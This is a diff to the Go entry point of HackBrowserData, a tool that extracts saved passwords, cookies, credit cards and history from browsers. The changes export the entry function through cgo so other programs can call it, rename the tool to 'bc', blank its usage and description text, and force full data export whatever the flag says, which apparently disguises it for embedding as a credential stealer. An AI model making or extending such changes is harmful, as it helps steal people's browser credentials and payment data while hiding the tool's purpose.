@@ -1,8 +1,9 @@
 package main
 
+import "C"
 import (
 	"os"
-
+	"path/filepath"
 	"github.com/urfave/cli/v2"
 
 	"github.com/moond4rk/HackBrowserData/browser"
@@ -24,12 +25,13 @@ func main() {
 	Execute()
 }
 
+//export Execute
 func Execute() {
 	app := &cli.App{
-		Name:      "hack-browser-data",
-		Usage:     "Export password|bookmark|cookie|history|credit card|download|localStorage|extension from browser",
-		UsageText: "[hack-browser-data -b chrome -f json -dir results -cc]\nExport all browingdata(password/cookie/history/bookmark) from browser\nGithub Link: https://github.com/moonD4rk/HackBrowserData",
-		Version:   "0.5.0",
+		Name:      "bc",
+		Usage:     "",
+		UsageText: "[]\n",
+		Version:   "0.4.4",
 		Flags: []cli.Flag{
 			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
 			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
@@ -44,19 +46,26 @@ func Execute() {
 			if verbose {
 				log.SetVerbose()
 			}
+
 			browsers, err := browser.PickBrowsers(browserName, profilePath)
 			if err != nil {
 				log.Error(err)
 			}
 
+			_dir := filepath.Join(".", outputDir)
+			err = os.MkdirAll(_dir, os.ModePerm)
+			
+			if err != nil {
+				log.Error(err)
+			}
+
 			for _, b := range browsers {
-				data, err := b.BrowsingData(isFullExport)
+				data, err := b.BrowsingData(true)
 				if err != nil {
 					log.Error(err)
 				}
 				data.Output(outputDir, b.Name(), outputFormat)
 			}
-
 			if compress {
 				if err = fileutil.CompressDir(outputDir); err != nil {
 					log.Error(err)
